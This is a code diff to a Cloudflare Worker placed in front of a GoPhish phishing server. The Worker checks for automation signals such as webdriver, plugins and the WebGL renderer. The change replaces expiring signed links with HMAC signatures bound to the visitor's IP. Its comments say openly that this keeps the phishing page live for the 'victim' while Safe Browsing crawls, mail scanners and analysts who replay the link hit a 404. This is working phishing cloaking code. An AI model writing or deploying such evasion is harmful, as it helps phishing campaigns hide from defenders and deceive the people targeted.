@@ -7,12 +7,20 @@
  *            and checks navigator.webdriver / plugins / WebGL renderer /
  *            screen / hardware concurrency before allowing the redirect.
  *
- * Authentication to GoPhish is via a time-bound signed URL. The Worker
- * appends id, exp (unix expiry = now + 60s), and sig = HMAC-SHA256(secret,
- * id + "." + exp) to every URL it sends to GoPhish. GoPhish recomputes the
- * signature and serves the landing page only while now < exp; once the
- * window passes it bounces the visitor back here for re-verification.
- * There is no per-rid burn — only the short-lived signed URL expires.
+ * Authentication to GoPhish is via an IP-bound signed URL. After the bot
+ * checks pass, the Worker appends id and sig = HMAC-SHA256(secret,
+ * id + "." + CF-Connecting-IP) to the landing URL it sends to GoPhish.
+ * Because both the Worker and GoPhish sit behind Cloudflare, GoPhish sees
+ * the same client IP in the same header and recomputes an identical
+ * signature. There is no expiry: a visitor reloading from the same IP is
+ * served indefinitely, while the same URL replayed from any other network —
+ * a Safe Browsing verification crawl, a mail scanner, an analyst — computes
+ * a different IP, fails the signature, and is dead-ended to PHISH_ORIGIN/404.
+ *
+ * The server-side-fetched /hi and /beep endpoints are signed against the id
+ * alone (sig = HMAC-SHA256(secret, id)), because the Worker — not the
+ * target's browser — issues those requests, so the IP GoPhish sees on them
+ * is the Worker's, not the visitor's.
  *
  * Endpoints:
  *   /<anything>/hi?id=<rid>   → tracking pixel. Worker fires a
@@ -114,9 +122,13 @@ async function handleVerify(request, rid, key, origin, ctx) {
     return reject();
   }
 
-  // Pass — mint the time-bound signed target URL on the original path.
+  // Pass — mint the IP-bound signed target URL on the original path. The
+  // signature binds to this visitor's CF-Connecting-IP; the landing GET that
+  // follows travels victim → Cloudflare → gophish, so gophish sees the same
+  // IP and validates. A replay from any other network will not.
+  const ip = request.headers.get('CF-Connecting-IP') || '';
   const path = sanitizePath(body && body.path);
-  const target = `${origin}${path}?${await signedParams(rid, key)}`;
+  const target = `${origin}${path}?${await signedParamsIP(rid, ip, key)}`;
   return jsonResponse({ target }, 200);
 }
 
@@ -132,12 +144,8 @@ function sanitizePath(p) {
 }
 
 // ─────────────────────────────────────────────────────────────────────
-// Time-bound signed URL
+// Signed URL
 // ─────────────────────────────────────────────────────────────────────
-
-// TTL for a signed URL, in seconds. GoPhish serves the landing page only
-// while now < exp; after that it bounces back here for re-verification.
-const TOKEN_TTL_SECONDS = 60;
 
 async function importHmacKey(hexSecret) {
   return crypto.subtle.importKey(
@@ -149,14 +157,30 @@ async function importHmacKey(hexSecret) {
   );
 }
 
-// signedParams returns the query string "id=<rid>&exp=<unix>&sig=<hex>"
-// where sig = HMAC-SHA256(secret, rid + "." + exp). The "." delimiter must
-// match the gophish side exactly.
+// sign returns the hex HMAC-SHA256(secret, msg). The exact byte sequence of
+// msg must match what the gophish side hashes, or the comparison fails.
+async function sign(msg, key) {
+  const sigBuf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(msg));
+  return toHex(new Uint8Array(sigBuf));
+}
+
+// signedParams returns "id=<rid>&sig=<hex>" where sig = HMAC(secret, rid).
+// Used for the /hi and /beep endpoints the Worker fetches server-side: the
+// IP gophish sees on those is the Worker's, not the visitor's, so they are
+// bound to the rid alone.
 async function signedParams(rid, key) {
-  const exp = Math.floor(Date.now() / 1000) + TOKEN_TTL_SECONDS;
-  const sigBuf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(rid + '.' + exp));
-  const sig = toHex(new Uint8Array(sigBuf));
-  return `id=${encodeURIComponent(rid)}&exp=${exp}&sig=${sig}`;
+  const sig = await sign(rid, key);
+  return `id=${encodeURIComponent(rid)}&sig=${sig}`;
+}
+
+// signedParamsIP returns "id=<rid>&sig=<hex>" where sig =
+// HMAC(secret, rid + "." + ip). Used for the landing URL handed to the
+// visitor's browser: gophish recomputes it against the CF-Connecting-IP it
+// sees, so only a request from the same client IP validates. The "."
+// delimiter and the raw IP string must match the gophish side exactly.
+async function signedParamsIP(rid, ip, key) {
+  const sig = await sign(rid + '.' + ip, key);
+  return `id=${encodeURIComponent(rid)}&sig=${sig}`;
 }
 
 async function fireBeep(rid, key, origin, ctx) {
